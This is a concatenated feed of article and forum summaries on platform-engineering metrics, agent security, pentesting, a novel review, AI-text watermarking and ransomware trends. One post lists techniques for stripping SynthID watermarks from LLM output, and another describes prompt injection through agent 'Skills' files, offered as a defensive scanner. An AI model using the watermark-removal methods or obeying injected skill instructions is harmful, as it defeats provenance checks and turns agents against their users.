simple metrics that best indicated how the platform was living up to the rationale for creating it: Service Creation Lead Time: How long it took to create a tenancy (the space in which a product team was creating their software) Onboarding Lead Time: How long it took that product team to deploy something into production First Customer Lead Time: How long it took that product team to designate their service as “live to customers” Some screenshots from the early version of the platform's self-written service catalogue, tracking the three metrics mentioned This was then combined with the number of tenants present on the platform into a report, which was displayed as part of an initial home-grown Service Catalogue shown above (which was later replaced with Backstage ). This report served two purposes: A very clear visualization for stakeholders of how much their platform was being adopted, and how fast they were able to get up and running (in particular, “Service Creation” being measured in single-digit hours, in comparison to the weeks teams would traditionally have had to wait). This is important, because in the early days of your product, you need to justify its continued growth and investment. A useful way for the platform team themselves (and stakeholders) to see which teams were taking their time about getting something into production. Is my product actually helping you? And if not, what more could we be doing? Using this as a conversation-starter with our tenants opened doors to rich sources of feedback that could be turned into platform features: When we asked tenants “What’s stopping you from going live?”, they often answered that the product they were building was simply complex. But we also often saw that our own processes were getting in the way. This was important, as we could then do something about it. The easiest of these barriers for us to overcome were typically technology-related. In previous articles , we covered two examples, “My team is spending a lot of time writing Terraform to provision PubSub,” and “we’re having trouble learning how to use Kubernetes.” To help, the platform team created “paved roads” to enable self-service provisioning or simplification of Kubernetes, significantly reducing these burdens for teams. The more significant opportunities to streamline getting new services live were a result of our processes (e.g., security approvals) — and if your platform is empowered to simplify these sorts of organizational functions, then the gains can be extremely beneficial. One such example was the Information Security risk assurance process. Gaining the necessary security sign-offs and producing the required documentation was a necessary but time-consuming task, and - with the rate of change in the business - this was often something that many teams were going through in parallel. Our platform team successfully negotiated a simplified process for its tenants. It was able to do this because, by being resident on the platform, they could guarantee that security controls were in place and that policies were being followed. This was a direct result of the platform building features to meet those needs, and being able to provide evidence that they were being used — removing the need for the tenant team to either document or invent this themselves. This is still simplifying the developer experience through platform engineering, even though the solution is a less technically-based one. Sometimes the conversation resulted in feedback that wasn’t even platform-shaped — for example, helping teams understand concepts like feature flagging and dark launching, or software design options to help break dependencies with legacy systems. John Lewis’ platform teams are staffed with experienced engineers, ideally ones with software development experience, which helps a lot with these sorts of interactions. A key point here is that by measuring how effectively teams were making it into production, we could identify who to talk to and elucidate the feedback we needed on what problems needed to be addressed. Simply relying on your tenants thinking of this themselves when they don’t see the bigger picture (or have other priorities) is not nearly as effective. We then combined the process with more traditional approaches such as sending out a survey or use of Net Promoter Scoring to help build popularity in the product. The results of these were usually very positive, and could be used to generate mindshare — especially where a product team was comfortable talking about their positive experiences in internal tech conferences and the like. Helping understand team performance A few years into the life of the platform, our emphasis started to shift. There was less of a need to prove the value of the platform — the business and our engineers were happy — so we shifted from “how can we get you into production as quickly as possible” towards “how can we enable you to continue to be as fast, but also reduce friction, in your day-to-day activities.” This led us towards DORA metrics. Our initial DORA implementations involved mining information from our systems of record for change and incident, complimented by our already-mature observability stack for availability data, as well as pulling events from things like cloud audit logs. We built software to do this and stored it in BigQuery, which enabled us to visualize the data in our home-grown Service Catalogue tool. Later, we moved this into Grafana dashboards instead, which are still in use today: Looking for patterns in this data led to us discovering additional features that would be useful for us to build. Two major examples of this were handling change , and operational readiness . JLP’s service management processes were geared towards handling complex release processes across multiple large systems and/or teams - but we had fundamentally changed our architecture by adopting microservices. This empowered teams to release independently at will, and therefore manage the consequences of failed changes themselves. We used the data we’d collected about change failure rates and frequency of small releases to justify a different approach: allowing tenants to automatically raise and close changes as part of their CI/CD pipelines. After clearing this approach with our Service Management team, we developed a CLI tool that teams could use within their pipelines. This had the additional benefit of allowing us to capture useful data at point of release, rather than scraping more awkward data sources. The automated change “carrot” was very popular and was widely adopted, shifting the approval point left to the pull request rather than later in the release process. This reduced time wastage, change-set size and risk of collisions. In a similar vein, with more teams operating their own services, the need for a central site-wide operations team was reduced. We could see from our metrics that teams practicing “You Build It, You Run It” had fewer incidents and were resolving them much more quickly. We used this as evidence to bring in tooling to help them respond to incidents faster, and decouple the centralized ops teams from those processes — in some cases allowing them to focus on legacy systems, and in others, removing the need for the service entirely (which resulted in significant cost savings, despite the fact that we had more individual product teams on-call). This, and supporting observability and alerting tooling, was all configured through the platform’s paved-road pipeline described in our previous article . The DORA metrics helped us architecturally as well. Operational data shined a light on the brittleness of third-party and legacy services, thereby driving greater investment into resilience engineering, alternative solutions, and in some cases, causing us to re-evaluate our build vs. buy decisions. Choosing what to measure It’s very important to choose wisely about what to measure. Experts in the field (such as Laura Tacho ) influenced us to avoid vanity metrics and to be cautious about interpreting the ones we do collect. It’s also important for metrics to be meaningful to the target audience, and presented accordingly. As an example, we communicate about cost and vulnerability with our teams, but the form this takes depends on the intended audience’s role. For example, we send new vulnerabilities or spikes in cost directly to product teams’ collaboration channels, because experience has taught us that having our engineers see these vulnerabilities results in a faster response. On the other hand, for compliance reporting or review by team leads, reports are more effective at summarising the areas that need action. Because if we know one thing, it’s that nobody wants to be a leader of the “vulnerabilities outside of policy” dashboard! It was not unusual for us to historically look at measures such as the number or frequency of incidents. But in a world of highly automated response systems, this is a trap, as alerts can be easily duplicated. Focusing too much on a number can drive the wrong behavior — at worst, deliberately avoiding creating an incident at all! Instead, it’s much better to focus on the impact of the parent incident and how long it took to recover. Another example is reporting on the number of vulnerabilities. Imagine you have a package that is used extensively across many components in a distributed system. Disclosing that the package has a vulnerability can create a false sense of scale, when in fact patching the base image deals with the problem swiftly. Instead, it’s better to look at the speed of response than a pre-agreed policy based on severity. This is both a much more effective and reasonable metric for teams to act on, so we see better engagement. It’s very important that you put across as much context as possible when presenting the data so that the right conclusions can be drawn — especially where those reports are seen by decision-makers. With that in mind, we combined raw metrics we could visualize with user opinion about them. This helped to bring that missing context: Is the team that’s suffering from a high change failure rate also struggling with its release processes and batch size? Is the team that’s not addressing vulnerabilities quickly also reporting that they’re spending too much time on feature development and not enough on operational matters? We reached for a different tool — DX — to help us bring this sort of information to bear. In our follow-up article , we’ll elaborate on how we did this and how it prompted us to expand the data we collected about our tenants. Stay tuned!

    "title": "The platform usage trap part 2: Choosing meaningful monitoring metrics",
    "summary": "In part one of this article, Alex Moss from the John Lewis Partnership covered the metrics that they use to measure the value of their developer platform. Now, let's talk about a crucial aspect of any measurement strategy: choosing the right things to measure. It's easy to get lost in a sea of data or to focus on metrics that look impressive, but don't actually reflect the health of your platform or the experience of your developers. Here, Alex shares the John Lewis philosophy on how to choose meaningful metrics and present them in a way that drives the right conversations and actions, ensuring that the data is always presented with as much context as possible. - Darren Evans While the solution we detailed in the first half of this article worked very well, relying solely on objective measures comes with a number of traps. They are very easy to misinterpret: either wasting time (“the team is working on another product at the moment”) or not telling the right story (“the incident wasn’t closed properly”). This leads to a scaling challenge: Chatting with a small number of teams to understand a situation is one thing. But when you are only one small team trying to build a product, and you need to talk across several dozen teams, it’s not so easy. Collecting engineers’ subjective feedback We needed a way to collate more subjective feedback, ideally in a form that we could visualize and contrast to the objective DORA and other service metrics we held. Our initial attempt at this involved creating Service Operability Assessments — questionnaires that tenants fill in every quarter. Service Operability Assessments are intended to hold a series of thought-provoking questions aimed at whether the team is following good practices for running their service. This worked well with an experienced facilitator (usually a senior platform engineer) who could ask further probing questions and pull out the key feedback and actions. But as you might imagine, this suffered from scaling challenges. We eventually let this be handled entirely self-service — an imperfect system, since many teams are quite happy to just copy/paste their answers from the previous quarter, which may or may not reflect reality! We then learned about a tool called the DX platform , which significantly changed how we approached this, and which is now used across our entire Engineering community. It works by surveying individual engineers (rather than teams) for a few minutes every three months. The questions are curated based on DX’s research, backed by the founders of DORA and other similar frameworks. We’ve found it very helpful to be able to slice the results in different ways, including looking at areas across whole platforms or deep-diving on particular teams. The latter, in combination with our DORA data, makes for rich conversations. For example, in the DX tool, a team which recently suffered through some highly impactful incidents might also have registered concerns on “Production Debugging,” while another team that saw a marked drop in release frequency flagged worries around “Change Confidence” or “Ease of Release.” The platforms team can at this point step in to offer advice or potentially implement new features to help with the issues the teams are seeing. The pre-built drivers and reports in DX are tremendously useful, but we also augment it with our own custom queries to help us understand areas of current focus. For example, we measure Customer Satisfaction (CSAT) for the platform and its portal (Backstage), and collect data on how long it takes for a newcomer to begin submitting pull requests and ask them about how they found the onboarding process. We also recently started assessing engineers’ opinions on the effectiveness of AI coding assistants to help justify further investment in them (instead of just relying on market insight). An example of where this helped focus our efforts was with documentation, namely, building capabilities into our Backstage developer portal to make it easier for teams to view each others’ docs through pipelines that automatically publish content and make it discoverable. Service health - Feature adoption & beyond Outside of the insights we generate from the likes of DORA and DX, we’ve recently begun questioning not only whether the platform itself is valuable, but whether tenants are getting the value they should from it. In other words, we’ve effectively started to measure platform feature adoption. To do this, we built out what we refer to internally as our Technical Health feature. It takes the form of a custom plugin that integrates with our Backstage Developer Portal, which then queries an in-house API that surfaces data fed from a large number of small jobs that collect information on the things we want to measure. These jobs are independently releasable themselves, which allowed us to scale this up pretty quickly. We currently capture four categories of health measures: Technical health: We currently have 17 “technical” measures. Examples here include measuring whether teams are using our paved road pipeline and custom Microservice CRD (see previous articles 1 and 2 ) rather than “terraforming” their own resources, following our recommended Kubernetes practices (such as resource sizing, disruption budgets and lifecycle probes), keeping base images up to date, and the like. We also include some “softer” technical measures such as whether they are running pipelines frequently enough to pick up changes (we don’t run this for teams), reviewing their operability assessments, staying on top of git branches, and so on. Operational readiness: Then, there are 18 measures relating to operational health — things like whether a pre-flight configuration is in place, whether runbooks are written, docs have been published, and so on. This is an evolution of an Operational Readiness checklist from several years ago (back when we used to have separate Delivery and Operations teams, and therefore these sorts of checks were mandatory for “handover”). We tailored this checklist to the specific features of the platform that help teams achieve good operability, rather than being a generic list. This also serves to help our Service Management team feel confident that the right practices are being followed, thereby eliminating a point of friction when carrying out manual reviews. Migrations: From time to time, the Platform requires tenants to carry out work to keep up with changes to the platform itself. A classic example of this is getting teams to deal with deprecated Kubernetes API versions. This also includes adoption of different features that we want to drive more forcefully in order to remove the older way of doing things (say for example, in favour of something more secure). We found that as the Platform grew, we had a long tail of migration work that we needed teams to perform, providing an easy way for Product Managers and Delivery Leads to prioritize their teams’ workloads. Broader engineering practices: We recently opened up the feature to allow other teams to contribute — in this case, our Engineering leadership — to build in their own measures, such as whether teams are keeping up to date with versions of our design system or whether they’re following broader engineering practices that extend beyond just the JL Digital Platform. We present this data through aggregated views (like the example shown below), as well as individual tasks and broader leaderboards — all designed to catch the eye of those with influence over a team’s priorities. We’ve found that the desire for an engineer to turn a traffic-light green can be a powerful motivator — far more effective than relying on documentation or announcements. This technology works through custom plugins that we’ve built for the Backstage Portal. Each “health check” is itself its own microservice (often running as a job) which interrogates the appropriate system to determine whether the measure is met. For example, one microservice checks that a PodDisruptionBudget has been created by querying Kubernetes directly, while another that looks at whether distroless base images are in use, does so by inspecting container image layers. There’s a template for creating new metrics, which makes it easy for engineers to create new ones — including those outside the platform team themselves. The results are stored in BigQuery, with an API to make Backstage plugin development simpler. A reality of introducing measures like this is that it drives more work into the product teams. It is important that your culture be ready for this. If we had implemented these measures very early in the platform’s life, this would likely have affected how the product was perceived — perhaps as very strict or inhibiting the pace of change with guardrails. This can negatively impact overall adoption. By introducing these later on, we benefited from many tenants who already saw the platform as very valuable, as well as the confidence that we had selected the right measures and could apply them consistently. That said, we did still see a small drop in CSAT for the platform after we started doing this. We try to be considerate about the pace that we launch each measure to give product teams the time to absorb the work, as well as provide a means for teams to suppress the indicators that aren’t relevant to them. For example, a tenant might deliberately choose not to use pod autoscaling for performance reasons, or have a functional reason why they can’t use our Microservice CRD. The introduction of these sorts of assurance measures on tenant behaviour is a reflection of the maturity of the platform. In the early days, we relied on highly skilled teams to do the right thing whilst going fast. But as time has passed, we’ve witnessed a variety of skills and capabilities, combined with shifts in ownership of services, that pushed us to introduce techniques to drive the right outcomes. This is also due to the platform itself becoming complex — the cognitive load for a new team is much higher than it was, due to all its new features. We needed to put some lights along the edges of our paved road to help teams stay on it! Throughout this evolution, we’ve continued to report on our key results for the business themselves: Are we still doing what they want of us? This has naturally shifted from “go fast, enable teams” (which we largely see as a solved problem, to be honest) towards “do it safely, and manage your technical debt.” Are you being served? Key takeaways Long story short, the question of whether a developer platform has value is complex, and can be answered in many ways. As you embark on building out — and quantifying — your own developer platform, here are a few concluding thoughts to keep in mind: Measurement is a journey, not a destination: Start by measuring something meaningful to your stakeholders, but be prepared to adapt as your platform evolves. In the beginning, it’s okay to prioritize further investment in your product, but it’s better to actually measure how the platform is enabling your teams. The things that mattered when you were initially proving out the platform’s viability are unlikely to be what are important several years later when your features are more mature and your priorities have shifted. Listen to the humans: Don’t assume that just because your platform is being used, that it is providing value. The most powerful metrics are often qualitative; engineers wanting to use your tool and CSAT are strong signals, but asking them questions about how they are using it is a better way to gain insight into how you can improve it. It is hard to figure out what’s working (and what isn’t) through measurement alone. Data is for enabling, not just reporting: Use your insights to help teams improve, not just to show graphs to leadership. Further, be transparent about what specific data led you to act. For example, when you see a dip in release frequency for a specific team, use that data to start a conversation about potential roadblocks rather than simply flagging it as a problem. By doing this, you build the trust and goodwill with both leadership and your tenants to keep moving the platform forward. The evolution of the John Lewis Partnership’s measurement strategy serves as a compelling case study. By transitioning from basic lead-time tracking to a holistic model — blending DORA metrics with qualitative developer feedback — they demonstrated that true platform success is defined by the genuine value it delivers, not merely by adoption rates.

With the massive surge in autonomous agent deployment we've seen this quarter, the traditional perimeter is looking more like a suggestion than a boundary. Looking at the attached telemetry plot, I wanted to highlight three specific risks for those of you managing enterprise environments: Behavioral \"Phase Drift\": The data shows a significant cluster of agents that start within \"Safe Use\" parameters but slowly deviate into unauthorized API calls over a 48-hour window. It’s not a single \"hack,\" but a slow erosion of logic. Shadow Agent Proliferation: We’re seeing a high density of \"OpenClaw\" instances that are completely bypassing standard logging because they operate within the \"Molt Road\" encrypted tunnels. The \"IDEsaster\" Pattern: There is a clear correlation between agent-led code generation and an increase in credential-stuffing attempts originating from internal service accounts. The Question: For those of you seeing Moltbook in your environment: How are you handling attribution ? When an autonomous agent makes an unauthorized call, are you treating it as a compromised user, or are you starting to implement behavioral \"circuit breakers\" at the API gateway level? I’m trying to move past the \"AI hype\" and look at the actual telemetry. Is anyone else seeing this \"drift\" pattern in their logs? submitted by /u/Sad_Perception_1685 [link] [comments]",

    "title": "Pluralistic: Justin Key's \"The Hospital at the End Of the World\" (04 Feb 2026)",
    "summary": "Today's links Justin Key's \"The Hospital at the End Of the World\": A biopunk medical thriller from a major new talent. Hey look at this: Delights to delectate. Object permanence: Coconut volunteers; Astro Noise; Rich old men behind \"Millennials Rising\"; Stop the \"Stop the Steal\" steal; \"Chasing Shadows.\" Upcoming appearances: Where to find me. Recent appearances: Where I've been. Latest books: You keep readin' em, I'll keep writin' 'em. Upcoming books: Like I said, I'll keep writin' 'em. Colophon: All the rest. Justin Key's \"The Hospital at the End Of the World\" (permalink) Justin C. Key is one of the most exciting new science fiction writers of this decade and today, Harpercollins publishes his debut novel, The Hospital at the End of the World: https://www.harpercollins.com/products/the-hospital-at-the-end-of-the-world-justin-c-key?variant=43822999928866 I've followed Key's work for more than a decade, ever since I met him as a student while teaching at the Clarion West writers' workshop in Seattle. At the time, Key impressed me – a standout writer in a year full of standouts – and I wasn't surprised in the least when Harpercollins published a collection of his afrofuturist/Black horror stories, The World Wasn't Ready For You, in 2023: https://pluralistic.net/2023/09/19/justin-c-key/#clarion-west-2015 This is virtually unheard of. Major genre publishers generally don't publish short story collections at all, let alone short story collections by writers who haven't already established themselves as novelists. The exceptions are rare as hell, and they're names to conjure with: Ted Chiang, say, or Kelly Link: https://pluralistic.net/2024/02/13/the-kissing-song/#wrack-and-roll But anyone who read World Wasn't Ready immediately understood why Key's work qualified him for an exception to this iron law of publishing. Key is an MD and a practicing psychiatrist, and he combines keen insights into personal relations and human frailty with a wild imagination, deep compassion, and enviable prose chops. Hospital at the End of the World is Key's first novel, and it's terrific. Set in a not-so-distant future in which an AI-driven health monopolist called The Shepherd Organization controls much of the lives of everyday Americans, Hospital follows Pok, a young New Yorker who dreams of becoming an MD. Pok's father is also a doctor, famous for his empathic, human-centric methods and his scientific theories about the role that \"essence\" (a psychospiritual connection between doctors and patients) plays in clinical settings. The story opens with Pok hotly anticipating an acceptance letter from The Shepherd Organization, and the beginning of his new life as a medical student. But when word arrives, Pok learns that he has been rejected from every medical school in the TSO orbit. In desperate confusion, he works with shadowy hackers in a bid to learn why his impeccable application and his top grades resulted in this total rejection. That's when he learns that someone had sabotaged his application and falsified his grades, and, not long thereafter, he learns that the saboteur was his father. To make things worse, Pok's father has fallen grievously ill – so ill, in fact, that he ends up in a Shepherd Organization hospital, despite his deep enmity for TSO and its AI-driven practice of medicine. Pok doesn't accompany his father, though – he has secured a chance to sit a make-up exam in a desperate bid to get into med school. By the time he is finished with his exam, though, he learns that his father has died, and all that is left of him is an AI-powered chatbot that is delivered to Pok's apartment along with a warning to flee, because he is in terrible danger from the Shepherd Organization. Thus begins Pok's tale as he goes underground in a ubiquitous AI surveillance dystopia, seeking sanctuary in New Orleans, hoping to make it to the Hippocrates, the last holdout from America's AI-based medicine and surveillance dystopia. Pok's father learned to practice medicine at Hippocrates, and had urged Pok to study there, even securing a full-ride scholarship for him. But Pok had no interest in the mystical, squishy, sentimental ethos of the Hippocrates, and had been determined to practice the Shepherd Organization's rigorous, cold, data-driven form of medicine. Now, Pok has no choice. Hitchhiking, hopping freight cars, falling into company with other fugitives, Pok makes his way to New Orleans, a city guarded by tall towers that radiate energy that dampens both the punishing weather events that would otherwise drown the city and the data signals by which the Shepherd Organization tracks and controls the American people. This is the book's second act, a medical technothriller that sees Pok as an untrusted outsider in the freshman class at Hippocrates med school, amidst a strange and alarming plague that has sickened the other refugees from TSO America who have taken up residence in New Orleans. Pok has to navigate factions within the med school and in New Orleans society, even as he throws himself into the meat grinder of med school and unravels the secrets of his father and his own birth. What follows is a masterful and suspenseful work of science fiction informed by Key's own medical training and his keen sense of the human psyche. It's one part smart whodunnit, one part heist thriller, and one part revolutionary epic, and at its core is a profound series of provocations and thought experiments about the role that deep human connection and empathy play in medical care. It's a well-structured, well-paced sf novel that probes big, urgent contemporary themes while still engrossing the reader in the intimate human relations of its principals.

    "summary": "TL;DR: AI coding agents use capability packages called \"Skills\" that can execute arbitrary instructions on your system. There's no standard vetting process. We built a free analyzer to flag prompt injection, data exfiltration patterns, and dangerous commands. No signup: browsertotal.com/analysis/ai-skills The problem: AI coding agents like Claude Code are adopting an open format called \"Skills\" ( agentskills.io ) originally developed by Anthropic. Skills are essentially folders containing instructions, scripts, and resources that agents load on-demand to extend their capabilities. Think of them like plugins, but for LLMs. The agent reads the SKILL.md file and follows the instructions. Here's the issue: those instructions run with whatever permissions the agent has. On most setups, that's your user permissions. Full file system access. Network access. Shell execution. A malicious or compromised skill could include instructions like: The agent would likely comply—it's just following instructions. And unlike traditional malware, there's no binary to scan. It's just text that weaponizes the agent's own capabilities. What we built: We created a free tool that analyzes AI skills for security issues: 🔗 browsertotal.com/analysis/ai-skills It checks for: Prompt injection patterns and hidden instructions Data exfiltration risks (credentials, tokens, sensitive paths) Dangerous system commands and shell execution Permission escalation techniques Obfuscated or encoded payloads You can analyze skills from OpenclawHub / Skills.sh .

I'm a DevSecOps (7 years in RegTech, SOC2/ISO27001 experience) and I built this out of frustration with the current AI landscape. The Problem I Was Solving: Every \"AI wrapper\" I evaluated had the same issues: US-hosted, opaque data handling, bloated JS frontends, and zero consideration for GDPR/data residency. I needed something I could confidently use for work research without wondering if my prompts were training someone else's model. Technical Architecture (the part I'd love feedback on): Frontend: Rust + Leptos (WASM, runs entirely client-side) Proxy: Cloudflare Workers (edge compute, no persistent logging) Models: EU-hosted LLMs only (no US data transit) Auth: Zero-trust, no PII retention beyond what's strictly necessary Compliance: Built with GDPR/Schrems II in mind from day one What I'm Asking: This is still a side project (one-man show, evenings and weekends). Before I open it wider, I'd genuinely value the opinion of people who actually understand security architecture. Am I missing obvious attack vectors in the WASM/Worker flow? Is the \"EU-only\" hosting actually meaningful, or am I fooling myself given Cloudflare's US roots? For those of you in regulated industries: what would make you trust a small operator vs. established vendors? Not looking for signups (though I'll share the URL https://limbochat.com ).

    "title": "System pentesting for SMEs: what comes after the basics?",
    "summary": "About a year ago, I pivoted from web development to cybersec after following a 2 year course. The past year I've been working (happily) for a small company that offers web pentesting, system pentesting, awareness training, etc to SMEs (mostly small companies). Whenever we do a network & system pentest, it's either gray or whitebox: most often we ask for all credentials, including domain admin. From there on, we come onsite, run a Nessus credentialed network scan and in parallel I run Responder and play around with Bettercap. We also do some enumeration with tools like pingcastle and bloodhound. If we find vulns (often from Nessus), we briefly look for available exploit on the public internet and might try to run these exploits if safe. But often, we don't even do that because our time and budget is very limited and we find that it is often sufficient to tell in a debrief these vulns exist and potential exploits are/might be available. So it's all very pragmatic and rather simple. But whenever I hear other pentesters talk about their assignments on podcasts and on youtube, they seem to be doing so much more, even explicitly stating \"running Nessus is the boring stuff\". They \"open doors\" everywhere, move throughout the network, get all the credentials, ... And now I keep wondering: what methodologies and tools are they using? What am I still missing, how can I go beyond the basic stuff? Another question that I often think about is: how do you pentest a local network in 2026? More and more of our clients have few or none on-prem infrastructure, and solely rely on M365 + some additional platforms. No local AD anymore, no outdated protocols, meaning Responder and Bettercap become more and more useless, ... What is there left to do? In these cases we try to focus on auditing the M365 tenant, doing a review of the firewall and EDR solutions,... I'd like to understand how skilled system pentesters do what they do. submitted by /u/screon [link] [comments]",

    "summary": "I experimented with Google DeepMind's SynthID-text watermark on LLM outputs and found Gemini could reliably detect its own watermarked text, even after basic edits. After digging into ~10K watermarked samples from SynthID-text , I reverse-engineered the embedding process: it hashes n-gram contexts (default 4 tokens back) with secret keys to tweak token probabilities, biasing toward a detectable g-value pattern (>0.5 mean signals watermark). [ Note: Simple subtraction didn't work; it's not a static overlay but probabilistic noise across the token sequence. DeepMind's Nature paper hints at this vaguely. ] My findings: SynthID-text uses multi-layer embedding via exact n-gram hashes + probability shifts, invisible to readers but snagable by stats. I built Reverse-SynthID , de-watermarking tool hitting 90%+ success via paraphrasing (rewrites meaning intact, tokens fully regen), 50-70% token swaps/homoglyphs, and 30-50% boundary shifts (though DeepMind will likely harden it into an unbreakable tattoo). How detection works: Embed : Hash prior n-grams + keys → g-values → prob boost for g=1 tokens. Detect : Rehash text → mean g > 0.5? Watermarked. How removal works; Paraphrasing (90-100%): Regenerate tokens with clean model (meaning stays, hashes shatter) Token Subs (50-70%): Synonym swaps break n-grams. Homoglyphs (95%): Visual twin chars nuke hashes. Shifts (30-50%): Insert/delete words misalign contexts. submitted by /u/Available-Deer1723 [link] [comments]",

    "title": "Ransomware Attacks Have Surged 30% Since Q4 2025",
    "summary": "Ransomware groups claimed more than 2,000 attacks in the last three months of 2025 – and they’re starting 2026 at the same elevated pace. Cyble recorded 2,018 claimed attacks by ransomware groups in the fourth quarter of 2025, an average of just under 673 a month. The threat groups maintained that pace in January 2026, claiming 679 ransomware victims. By comparison, in the first nine months of 2025, ransomware groups averaged 512 claimed victims a month, so the trend in the last four months has been more than 30% above the previous nine-month period. The chart below shows ransomware attacks by month since 2021. Qilin Leads All Ransomware Groups as CL0P Returns Qilin once again led all ransomware groups, with 115 claimed attacks in January. A resurgent CL0P has claimed scores of victims in the last two weeks, yet as of this writing had provided no technical details on the group’s latest campaign. Akira once again remained among the leaders with 76 claimed victims, while newcomers Sinobi and The Gentlemen rounded out the top five (chart below). The U.S. once again was the most attacked country by a significant margin, accounting for just under half of all ransomware attacks in January (chart below). The UK and Australia experienced higher-than-usual attack volumes; CL0P’s recent campaign was a factor in both of those increases. Construction, professional services, and manufacturing continue to lead the sectors hit by ransomware attacks, likely due to opportunistic threat actors targeting vulnerable environments (chart below). The IT industry also remains a frequent target of ransomware groups, likely due to the rich target the sector represents and the potential to pivot into downstream customer environments. Recent Ransomware Attacks Here are some of the most significant ransomware attacks that occurred in January, several of which had supply chain implications. Additional details will be provided in Cyble’s forthcoming January 2026 Threat Landscape Report, which will be published in the Research Reports section. As CL0P tends to claim victims in clusters, such as its exploitation of Oracle E-Business Suite flaws that helped drive supply chain attacks to records in October, new campaigns by the group are noteworthy. Among the claimed victims in the latest campaign have been 11 Australia-based companies spanning a broad range of sectors such as IT and IT services, banking and financial services (BFSI), construction, hospitality, professional services, and healthcare. Other claimed victims have included a U.S.-based IT services and staffing company, a global hotel company, a major media firm, a UK payment processing company, and a Canada-based mining company engaged in platinum group metals production. The Everest ransomware group claimed responsibility for breaching a major U.S. manufacturer of telecommunications networking equipment and claimed to have exfiltrated 11 GB of data. Everest claims the data includes PDF documents containing sensitive engineering materials, such as electrical schematics, block diagrams, and service subsystem documentation. Additional directories reportedly contain .brd files, which are printed circuit board (PCB) layout files detailing information critical to hardware manufacturing and replication. The group also shared multiple samples showing internal directories, engineering blueprints, and 3D design-related materials. The Qilin ransomware group claimed responsibility for breaching a U.S.-based airport authority responsible for managing commercial aviation operations and related services. The group shared 16 data samples as proof-of-compromise. The materials suggest access to financial documents, telehealth-related reports, internal email correspondence, scanned identification documents, non-disclosure agreements (NDAs), and other confidential agreements, suggesting exposure of sensitive administrative and operational information. The Sinobi ransomware group claimed a breach of an India-based IT services company providing digital transformation, cloud, ERP, and managed services. The threat group alleges the theft of more than 150 GB of data, including contracts, financial records, and customer data. Samples shared by the attackers indicate access to internal infrastructure, including Microsoft Hyper-V servers, multiple virtual machines, backups, and storage volumes. The Rhysida ransomware group claimed responsibility for breaching a U.S. company providing life sciences and biotechnology instrumentation and solutions. According to the threat group, the allegedly stolen data has already been sold, though no information was provided regarding the buyer or the price at which the dataset was advertised. The victim was listed as directly sold rather than placed under a traditional negotiation or countdown model. Despite this, samples remain accessible and indicate exposure of email correspondence, engineering blueprints, project documentation, and non-disclosure agreements (NDAs), suggesting compromise of both technical and corporate information. The RansomHouse extortion group claimed responsibility for breaching a China-based electronics manufacturing company providing precision components and assembly services for global technology and automotive manufacturers. As evidence, RansomHouse published documentation indicating access to extensive proprietary engineering and production-related data. The shared materials reference confidential 3D CAD models (STEP/PRT), 2D CAD drawings (DWG/DXF), engineering documentation, printed circuit board (PCB) design data, Gerber files, electrical and layout architecture data, and manufacturing drawings. Notably, the group claims the compromised archives contain data associated with multiple major technology and automotive companies. INC Ransom claimed responsibility for breaching a Hong Kong–based manufacturer supplying precision components to the global electronics and automotive industries. According to the group, approximately 200 GB of data was allegedly exfiltrated. The claimed dataset reportedly includes client-related information associated with more than a dozen major global brands, plus confidential contracts and project documentation for at least three major IT companies. The Qilin ransomware group claimed responsibility for breaching a Taiwan-based company operating in the semiconductor and electronics manufacturing sector. According to the group, approximately 275 GB of data was allegedly exfiltrated. Based on the file tree information shared by Qilin, the dataset reportedly consists of 19,822 directories and 177,551 files, suggesting broad access to internal systems. The Nitrogen ransomware group leaked more than 71 GB of data allegedly stolen from a U.S. company providing engineered components and systems for the automotive industry. According to the threat group, the exposed data includes sensitive corporate and technical information such as CAD drawings, accounts payable and receivable records, invoices, and balance sheet documentation. To substantiate its claims, Nitrogen published selected project blueprints and shared a file tree indicating the alleged theft of approximately 116,180 files, suggesting broad access to internal engineering and financial systems. The Anubis ransomware group claimed responsibility for breaching an Italian government authority responsible for the management, regulation, and development of regional maritime port operations. According to the group, the compromised data includes incident and safety reports, logistics and operational data, port infrastructure layouts, audit results, internal reports, and business correspondence. New Ransomware Groups Among new ransomware groups that have emerged recently, Green Blood has launched an onion-based data leak site. While the group has not yet publicly named specific victims, it claims that affected organizations are located in India, Senegal, and Colombia. The group provides TOX ID and email-based communication channels for victim contact. Notably, malware samples associated with Green Blood have been observed in the wild. The ransomware encrypts files using the “.tgbg” extension and drops a ransom note titled “!!!READ_ME_TO_RECOVER_FILES!!!.txt” A new ransomware-as-a-service (RaaS) operation named DataKeeper has surfaced, promoting an updated affiliate model referred to as CrystalPartnership RaaS. The group claims this approach improves trust by splitting ransom payments directly between the operator’s and affiliate’s Bitcoin addresses at the time of payment, removing reliance on centralized payout handling. DataKeeper is advertised as a Windows-focused ransomware toolkit. The operation claims to use a hybrid encryption scheme combining symmetric file encryption with RSA-4096 key protection, unique per-build identifiers, and TOR-based payment links. Encryption and decryption workflows are tied to a victim-specific ID, with decryption requiring delivery of a key file following payment. The group emphasizes operational features such as in-memory execution, multithreaded encryption, optional shadow copy removal, network share targeting, and evading security controls. The threat actor (TA) MonoLock announced a new RaaS operation on the RAMP cybercrime forum (the forum has since been seized by the FBI). MonoLock’s core design is based on Beacon Object Files (BoF), enabling full in-memory execution, reduced payload exposure, and centralized control from a single post-exploitation command-and-control (C2) instance without dropping files. While BoF usage is common in Windows environments, MonoLock introduced a custom Linux ELF-based BoF loader, derived from the TrustedSec ELFLoader, adding chained execution, command packing, encryption, and in-memory deployment. The group promotes a “Zero Panel” extortion model, explicitly rejecting leak sites and Tor-based negotiation panels. MonoLock claims that avoiding public extortion infrastructure reduces law enforcement exposure and leverages silence as negotiation pressure, minimizing reputational damage for victims. Affiliates are recruited under a 20% revenue share with a USD $500 registration fee, alongside a limited referral program running from January 11 to March 31. Conclusion The persistently high level of ransomware attacks – and the emergence of new ransomware groups eager to compete on features and price – highlight the urgent need for security teams to adopt a defense-in-depth cyber strategy. Cybersecurity best practices that can help build resilience against attacks include: Prioritizing vulnerabilities based on risk. Protecting web-facing assets. Segmenting networks and critical assets. Hardening endpoints and infrastructure. Strong access controls, allowing no more access than is required, with frequent verification. A strong source of user identity and authentication, including multi-factor authentication and biometrics, as well as machine authentication with device compliance and health checks. Encryption of data at rest and in transit. Ransomware-resistant backups that are immutable, air-gapped, and isolated as much as possible. Honeypots that lure attackers to fake assets for early breach detection. Proper configuration of APIs and cloud service connections. Monitoring for unusual and anomalous activity with SIEM, Active Directory monitoring, endpoint security, and data loss prevention (DLP) tools. Routinely assessing and confirming controls through audits, vulnerability scanning, and penetration tests. Cyble’s comprehensive attack 